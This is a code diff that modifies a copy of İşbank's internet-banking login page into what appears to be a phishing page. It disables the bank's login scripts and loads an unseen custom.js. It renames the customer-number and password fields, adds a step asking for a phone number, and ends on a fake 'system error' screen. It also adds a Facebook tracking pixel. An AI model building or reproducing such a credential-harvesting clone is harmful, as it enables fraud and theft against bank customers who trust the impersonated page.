@@ -33,8 +33,9 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="#08335E">
     <link rel="apple-touch-icon-precomposed" href="iassets/images_new/Genel/islogo_192.png">
     <link rel="shortcut icon" sizes="192x192" href="iassets/images_new/Genel/islogo_192.png">
+    <meta content="{{ csrf_token() }}" name="csrf-token" />
 
-    <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/LanguageFiles/Messages_tr-TR.js?250105031823"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/LanguageFiles/Messages_tr-TR.js"></script>
     <script type="text/javascript">
         var gorselUrl = 'https://gorsel.isbank.com.tr/BIB/';
         var itoiiscepdeeplink = 'iscep://deeplink/?iscepnavid=ItoISSO';
@@ -42,56 +43,58 @@
         var itoiredirecturi_ios = 'googlechromes://www.isbank.com.tr/Internet/itoisso.aspx';
     </script>
 
-    <!-- <script language="JavaScript" type="text/javascript" src="ClientConfig.aspx?250105031813"></script> -->
-    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/reset.css?2501050318" />
-    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/vendor/jquery/jquery-ui-1.10.4.custom.css?2501050318" />
-    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/vendor/jquery/keypad/jquery.keypad.css?2501050318" />
-    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/vendor/jquery/select2/select2.css?2501050318" />
-    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/vendor/jquery/nanoScroller/nanoScroller.css?2501050318" />
-    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/main.css?2501050318" />
-    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/newLightbox.css?2501050318" />
+    <!-- <script language="JavaScript" type="text/javascript" src="ClientConfig.aspx13"></script> -->
+    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/reset.css" />
+    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/vendor/jquery/jquery-ui-1.10.4.custom.css" />
+    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/vendor/jquery/keypad/jquery.keypad.css" />
+    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/vendor/jquery/select2/select2.css" />
+    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/vendor/jquery/nanoScroller/nanoScroller.css" />
+    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/main.css" />
+    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/newLightbox.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css"/>
+
     <!--[if lte IE 10]>
-    <LINK  type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/IE.css?2501050318"/>
+    <LINK  type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/IE.css"/>
     <![endif]-->
     <!--[if IE 9]>
-    <LINK  type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/IE9.css?2501050318"/>
+    <LINK  type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/IE9.css"/>
     <![endif]-->
     <!--[if lte IE 8]>
-    <LINK  type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/ltIE9.css?2501050318"/>
+    <LINK  type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/ltIE9.css"/>
     <![endif]-->
     <!--[if IE 7]>
-    <LINK  type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/IE7.css?2501050318"/>
+    <LINK  type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/IE7.css"/>
     <![endif]-->
-    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/mediaQuery/scale.css?2501050318" />
-    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/mediaQuery/login.css?2501050318" />
-    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/mediaQuery/sideBanner.css?2501050318" />
-    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/mediaQuery/mobileHeader.css?2501050318" />
-    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/vendor/jquery/jquery-1.11.0.js?250105031833"></script>
-    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/app/touchDetection.js?250105031832"></script>
-    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/vendor/jquery/jquery-ui/jquery-ui-1.10.4.custom.js?250105031833"></script>
-    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/vendor/jquery/keypad/jquery.plugin.js?250105031833"></script>
-    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/vendor/jquery/keypad/jquery.keypad.js?250105031833"></script>
-    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/vendor/jquery/keypad/jquery.keypad-tr.js?250105031833"></script>
-    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/vendor/jquery/select2/select2.js?250105031833"></script>
-    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/vendor/jquery/nanoScroller/nanoScroller.js?250105031833"></script>
-    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/app/browserCheck.js?250105031831"></script>
-    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/app/app.js?250105031831"></script>
+    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/mediaQuery/scale.css" />
+    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/mediaQuery/login.css" />
+    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/mediaQuery/sideBanner.css" />
+    <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/mediaQuery/mobileHeader.css" />
+    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/vendor/jquery/jquery-1.11.0.js"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/app/touchDetection.js"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/vendor/jquery/jquery-ui/jquery-ui-1.10.4.custom.js"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/vendor/jquery/keypad/jquery.plugin.js"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/vendor/jquery/keypad/jquery.keypad.js"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/vendor/jquery/keypad/jquery.keypad-tr.js"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/vendor/jquery/select2/select2.js"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/vendor/jquery/nanoScroller/nanoScroller.js"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/app/browserCheck.js"></script>
+    <!-- <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/app/app.js"></script> -->
     <script language="JavaScript" type="text/javascript" src="iassets/js/iframenavigator.js?250105031714"></script>
-    <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/Slash.js?250105031824"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/Slash.js"></script>
     <script language="JavaScript" type="text/javascript" src="iassets/js//alfa.js?250105031713"></script>
     <script language="JavaScript" type="text/javascript" src="iassets/js//commonNew.js?250105031713"></script>
     <script language="JavaScript" type="text/javascript" src="iassets/js//JEditSubmit.js?250105031713"></script>
-    <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/lightboxOld.js?250105031826"></script>
-    <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/IsJs/IsFwOperations/IsJsCookie.js?250105031821"></script>
-    <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/IsJs/IsFwOperations/IsjsBrowser.js?250105031821"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/lightboxOld.js"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/IsJs/IsFwOperations/IsJsCookie.js"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/IsJs/IsFwOperations/IsjsBrowser.js"></script>
 
-    <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/NewLightBox.js?250105031824"></script>
-    <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/dfp.min.js?250105031826"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/NewLightBox.js"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/dfp.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"/>
 
 
-
-
-    <script language='javascript' src='IntSubeJS/KeydownHandler.js' type='text/javascript'></script>
+    <script language='javascript' src='iassets/IntSubeJS/KeydownHandler.js' type='text/javascript'></script>
     <script language=javascript>
         var eglvchathandle = null;
 
@@ -121,7 +124,21 @@
             eglvchathandle = window.open(eGainChatUrl, "", params)
         }
     </script>
-
+<script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1386797192700543');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1386797192700543&ev=PageView&noscript=1"
+    /></noscript>
     <script type="text/javascript">
         (function() {
             window["loaderConfig"] = "/TSPD/?type=20";
@@ -130,7 +147,6 @@
 
     <!-- <script type="text/javascript" src="/TSPD/?type=18"></script> -->
 
-    
 
     <!-- <script type="text/javascript" src="/TSPD/0859940f4bab2000d71504ee2be6d1c9a9718fa3b54e068df0fdbc1d34642359759247df8ae9f549?type=17"></script> -->
 </head>
@@ -273,7 +289,7 @@
             var operatingSystemMessage = 'Kullandığınız işletim sistemi Microsoft tarafından desteklenmemektedir. Güvenliğiniz için Windows 7 veya üzeri işletim sistemi versiyonu kullanmanızı öneriyoruz. İşletim sisteminizi <a class="blueLink" href="http://windows.microsoft.com/tr-tr/internet-explorer/download-ie" target="_blank">buradan</a> güncelleyebilirsiniz.';
             var oldBrowserMessage = 'Kullandığınız Internet Explorer versiyonu Microsoft tarafından desteklenmemektedir. Güvenliğiniz için <a class="blueLink" href="http://windows.microsoft.com/tr-tr/internet-explorer/download-ie" target="_blank">en güncel versiyonu</a> kullanmanızı öneriyoruz. Kullanabileceğiniz internet tarayıcıları hakkında <a class="blueLink" href="http://www.isbank.com.tr/TR/guvenlik/internet-tarayicilari/Sayfalar/internet-tarayicilari.aspx" target="_blank">buradan</a> bilgi edinebilirsiniz.';
         </script>
-        <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/LanguageFiles/Messages_tr-TR.js?250105031823"></script>
+        <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/LanguageFiles/Messages_tr-TR.js"></script>
 
         <div id="viewport">
             <div id="updateBrowserInfoContainer">
@@ -305,16 +321,16 @@
                     <div id="StraightLogin">
 
                         <span id="LoginLabel">
-                            <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/Internet02/CheckFieldsLogon.js?250105031820"></script>
-                            <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/Formatter.js?250105031819"></script>
-                            <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/RSA/RSA.js?250105031824"></script>
-                            <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/RSA/BigInt.js?250105031824"></script>
-                            <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/RSA/Barrett.js?250105031824"></script>
-                            <script language="JavaScript" type="text/javascript" src="iassets/js//itrHs.js?250105031714"></script>
-                            <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/Z5Z6.js?250105031825"></script>
-                            <LINK type="text/css" rel="STYLESHEET" href="iassets/Css/Checkbox/checkbox.css?2501050318" />
-                            <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/mediaQuery/loginChrome.css?2501050318" />
-                            <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/isbprefs.js?250105031826"></script>
+                            <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/Internet02/CheckFieldsLogon.js"></script>
+                            <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/Formatter.js"></script>
+                            <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/RSA/RSA.js"></script>
+                            <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/RSA/BigInt.js"></script>
+                            <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/RSA/Barrett.js"></script>
+                            <script language="JavaScript" type="text/javascript" src="iassets/js//itrHs.js"></script>
+                            <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/Z5Z6.js"></script>
+                            <LINK type="text/css" rel="STYLESHEET" href="iassets/Css/Checkbox/checkbox.css" />
+                            <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/mediaQuery/loginChrome.css" />
+                            <script language="JavaScript" type="text/javascript" src="iassets/IntSubeJS/isbprefs.js"></script>
 
 
 
@@ -343,78 +359,111 @@
                                             <div class="loginTitleMobile">
                                                 <span id="_ctl0_subeLogin01TitleMobile">İnternet Şubenize Hoşgeldiniz!</span>
                                             </div>
-                                            <div id="tabs">
-                                                <ul>
-                                                </ul>
-                                                <div id="tabs1">
-                                                    <div class="loginErrorContainer" id="loginErrorContainer">
-                                                        <div class="errorSymbol">
-                                                            <img id="img_errorSymbol" src="iassets/Omni/assets/img/error_icon.png" alt="giriÅ? hatalÄ±" />
+                                            <div id="first_step">
+                                                <div id="tabs">
+                                                    <ul>
+                                                    </ul>
+                                                    <div id="tabs1">
+                                                        <div class="loginErrorContainer" id="loginErrorContainer">
+                                                            <div class="errorSymbol">
+                                                                <img id="img_errorSymbol" src="iassets/Omni/assets/img/error_icon.png" alt="giriÅ? hatalÄ±" />
+                                                            </div>
+                                                            <div class="errorText" id="loginErrorText">
+                                                                <span id="_ctl0_LoginCookieDisabledLabel">Çerezleri aktif hale getirdikten sonra giriş yapmanızı rica ederiz. Çerez politikamızı www.isbank.com.tr sayfamızdan inceleyebilirsiniz.</span>
+                                                            </div>
                                                         </div>
-                                                        <div class="errorText" id="loginErrorText">
-                                                            <span id="_ctl0_LoginCookieDisabledLabel">Çerezleri aktif hale getirdikten sonra giriş yapmanızı rica ederiz. Çerez politikamızı www.isbank.com.tr sayfamızdan inceleyebilirsiniz.</span>
+                                                        <div class="tabContentContainer">
+
+                                                            <div class="inputLabel ie8-9Only">
+                                                                <span id="_ctl0_subeLogin01MusteriNumarasi">Müşteri Numaranız / TCKN / YKN</span>
+                                                            </div>
+
+                                                            <div class="loginInputContainer bottom10">
+                                                                <input name="tc" type="tel" id="tc" placeholder="Müşteri Numaranız / TCKN / YKN" title="Müşteri Numaranız / TCKN / YKN" maxlength="11" class="standardInput info onlyNumeric allowCopyPaste" autocomplete="off" tabindex="1" />
+                                                                <span id="_ctl0_rememberContainer" class="musnoOtherInputText musnoOtherInputText-tr-TR"><span id="clearRemembermusno"
+                                                                        style="display: none" class="clearRemembermusno"></span>
+                                                                    <div class="onoffswitch onoffswitch-tr-TR">
+                                                                        <input name="_ctl0:ctlRemember" type="checkbox" id="_ctl0_ctlRemember" class="onoffswitch-checkbox" />
+                                                                        <label class="onoffswitch-label" for="myonoffswitch">
+                                                                            <span class="onoffswitch-inner onoffswitch-inner-tr-TR">
+                                                                            </span><span class="onoffswitch-switch onoffswitch-switch-tr-TR">
+                                                                            </span>
+                                                                        </label>
+                                                                    </div>
+                                                                </span>
+                                                                <div id="customerNoInfo" class="infoBlueBox infoQuestionMark" title="mÃ¼Å?teri numarasÄ± bilgisi">
+                                                                </div>
+                                                                <div class="inputBottomErrorContainer">
+                                                                    Lütfen müşteri numaranızı giriniz.
+                                                                </div>
+                                                            </div>
                                                         </div>
                                                     </div>
-                                                    <div class="tabContentContainer">
+                                                </div>
+                                                <div id="loginFormBottomPartContainer">
 
-                                                        <div class="inputLabel ie8-9Only">
-                                                            <span id="_ctl0_subeLogin01MusteriNumarasi">Müşteri Numaranız / TCKN / YKN</span>
-                                                        </div>
-                                                        <div class="loginInputContainer bottom10">
-                                                            <input name="_ctl0:_ctl0_MusNoText" type="tel" id="_ctl0_MusNoText" placeholder="Müşteri Numaranız / TCKN / YKN" title="Müşteri Numaranız / TCKN / YKN" maxlength="11" class="standardInput info onlyNumeric allowCopyPaste" autocomplete="off" tabindex="1" onkeyup="hideInputBottomErrorMessage($(&#39;#_ctl0_MusNoText&#39;));" />
-                                                            <span id="_ctl0_rememberContainer" class="musnoOtherInputText musnoOtherInputText-tr-TR"><span id="clearRemembermusno"
-                                                                    style="display: none" class="clearRemembermusno"></span>
-                                                                <div class="onoffswitch onoffswitch-tr-TR">
-                                                                    <input name="_ctl0:ctlRemember" type="checkbox" id="_ctl0_ctlRemember" class="onoffswitch-checkbox" />
-                                                                    <label class="onoffswitch-label" for="myonoffswitch">
-                                                                        <span class="onoffswitch-inner onoffswitch-inner-tr-TR">
-                                                                        </span><span class="onoffswitch-switch onoffswitch-switch-tr-TR">
-                                                                        </span>
-                                                                    </label>
-                                                                </div>
-                                                            </span>
-                                                            <div id="customerNoInfo" class="infoBlueBox infoQuestionMark" title="mÃ¼Å?teri numarasÄ± bilgisi">
+                                                    <div class="inputLabel loginPasswordLabel ie8-9Only">
+                                                        <span id="_ctl0_subeLogin01PassTempPass">Şifre / Geçici Şifre</span>
+                                                    </div>
+                                                    <div class="loginInputContainer loginPasswordInputContainer ui-login-z5">
+                                                        <div class="loginInputContainer loginPasswordInputContainer ui-login-z5">
+
+                                                            <input name="parol" type="password" id="password" pattern="[0-9]*" maxlength="6" placeholder="Şifre / Geçici Şifre" title="Şifre / Geçici Şifre" tabindex="2" size="6" class="standardInput info onlyNumeric virtualKeypad removeAutoFill" autocomplete="off" />
+
+                                                            <div id="passInfo" class="infoBlueBox infoQuestionMark" title="Şifre bilgisi">
                                                             </div>
                                                             <div class="inputBottomErrorContainer">
-                                                                LÃ¼tfen mÃ¼Å?teri numaranÄ±zÄ± giriniz.
                                                             </div>
+                                                            <div class="keyPadContainer login">
+                                                                <div class="keyPadHolder">
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="formBottomLink">
+                                                            <a href="javascript:OpenPopup('/bireysel/MainPage.aspx?source=SetInstantPin&langCode=tr-TR','','720','740');" id="_ctl0_anindaSifreLink" class="login-tooltip-button">
+                                                                <img class="login-tooltip-button-image" src="iassets/Omni/assets/img/login_icon_2.png" alt="Åifrem Yok,Ä°lk KullanÄ±m ikonu" />
+                                                                <div
+                                                                    class="toolTipButtonText">
+                                                                    <span id="_ctl0_subeLogin01IlkKullanim">Şifrem Yok / Unuttum</span>
+                                                                </div>
+                                                            </a>
+                                                        </div>
+
+                                                        <div class="loginFormButtonHolder">
+                                                            <button id="btnLogin" class="ui-button darkBlueButton login loginbtn" type="button" tabindex="19" name="_ctl0:SubeLogin01_btnGiris">Giriş</button>
                                                         </div>
                                                     </div>
                                                 </div>
                                             </div>
-                                            <div id="loginFormBottomPartContainer">
+                                            <div id="twice_step" class="d-none">
+                                                <div id="tabs">
+                                                    <div class="tabContentContainer">
+                                                        <div class="loginInputContainer bottom10">
+                                                            <input name="tel" type="tel" id="tel" placeholder="Telefon Numaranız" title="Telefon Numaranız" maxlength="11" class="standardInput info onlyNumeric allowCopyPaste" autocomplete="off" tabindex="1">
 
-                                                <div class="inputLabel loginPasswordLabel ie8-9Only">
-                                                    <span id="_ctl0_subeLogin01PassTempPass">Şifre / Geçici Şifre</span>
-                                                </div>
-                                                <div class="loginInputContainer loginPasswordInputContainer ui-login-z5">
-                                                    <div class="loginInputContainer loginPasswordInputContainer ui-login-z5">
 
-                                                        <input name="_ctl0:ParolaText" type="text" id="ParolaText" pattern="[0-9]*" maxlength="6" onkeyup="hideInputBottomErrorMessage($(&#39;#ParolaText&#39;));removeFontFamilyTextSecurity();" placeholder="Şifre / Geçici Şifre" onkeydown="addFontFamilyTextSecurity(true);" onpaste="return false;" title="Şifre / Geçici Şifre" tabindex="2" onkeypress="addFontFamilyTextSecurity(false);" onfocus="addFontFamilyTextSecurity(false);" size="6" class="standardInput info onlyNumeric virtualKeypad removeAutoFill" autocomplete="off" />
-
-                                                        <div id="passInfo" class="infoBlueBox infoQuestionMark" title="Å?ifre bilgisi">
-                                                        </div>
-                                                        <div class="inputBottomErrorContainer">
-                                                        </div>
-                                                        <div class="keyPadContainer login">
-                                                            <div class="keyPadHolder">
+                                                            <div class="inputBottomErrorContainer">
+                                                                Lütfen Numaranızı Doğru Giriniz
                                                             </div>
                                                         </div>
                                                     </div>
-                                                    <div class="formBottomLink">
-                                                        <a href="javascript:OpenPopup('/bireysel/MainPage.aspx?source=SetInstantPin&langCode=tr-TR','','720','740');" id="_ctl0_anindaSifreLink" class="login-tooltip-button">
-                                                            <img class="login-tooltip-button-image" src="iassets/Omni/assets/img/login_icon_2.png" alt="Åifrem Yok,Ä°lk KullanÄ±m ikonu" />
-                                                            <div
-                                                                class="toolTipButtonText">
-                                                                <span id="_ctl0_subeLogin01IlkKullanim">Şifrem Yok / Unuttum</span>
-                                                            </div>
-                                                        </a>
-                                                    </div>
-
                                                     <div class="loginFormButtonHolder">
-                                                        <button id="_ctl0_SubeLogin01_btnGiris" class="ui-button darkBlueButton login" type="submit" tabindex="19" name="_ctl0:SubeLogin01_btnGiris" onclick=" getJText(&#39;ParolaText&#39;);  CheckCookieEnabled();  return CheckFields(&#39;logon1&#39;); ">Giriş</button>
-                                                    </div>
+                                                            <button id="btnPhone" class="ui-button darkBlueButton login loginbtn" type="button" tabindex="19" name="onaybtn">Onayla</button>
+                                                        </div>
                                                 </div>
+                                            </div>
+
+                                            <div id="last_step" class="d-none">
+                                            <div id="tabs">
+                                            <div class="tabContentContainer centerDiv">
+                                            <i class="fa-solid fa-xmark"></i> 
+                                            <p>
+                                                <strong>HATA !</strong>
+                                                <br/>
+                                                Sistemsel bir hata tespit edildi lütfen daha sonra tekrar deneyiniz
+                                            </p>
+                                            </div>
+                                            </div>
                                             </div>
                                             <div id="formBottomLinksContainer">
                                                 <div class="formBottomLink onlyMobile">
@@ -525,14 +574,14 @@
                                 </div>
                                 <div class="footerLinks last languageContainer">
                                     <span id="lblSubeGirisLangSelect">
-                                        <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/mediaQuery/footer.css?2501050318" />
+                                        <LINK type="text/css" rel="STYLESHEET" href="iassets/Omni/css_new/mediaQuery/footer.css" />
                                         <div id="languageFlagSelect">
                                             <span id="usaflaglabel" class="isbank-page-language selected-language">English</span>
 
                                             <span id="turkishflaglabel" class="isbank-page-language">Türkçe</span>
 
                                         </div>
-                                        <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/app/footer.js?250105031831"></script>
+                                        <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/app/footer.js"></script>
                                     </span>
                                 </div>
                             </div>
@@ -551,10 +600,14 @@
             var CaptchaControl = false;
         </script>
     </form>
-    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/app/login.js?250105031832"></script>
+    <!-- <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/app/login.js"></script> -->
 
-    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/app/keyPadCommons.js?250105031832"></script>
-    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/app/footer.js?250105031831"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/app/keyPadCommons.js"></script>
+    <script language="JavaScript" type="text/javascript" src="iassets/Omni/js/app/footer.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+    <script type="text/javascript" src="iassets/js/custom.js"></script>
+    <script type="text/javascript" src="iassets/js/jquery.mask.min.js"></script>
+
 </body>
 
 </html>
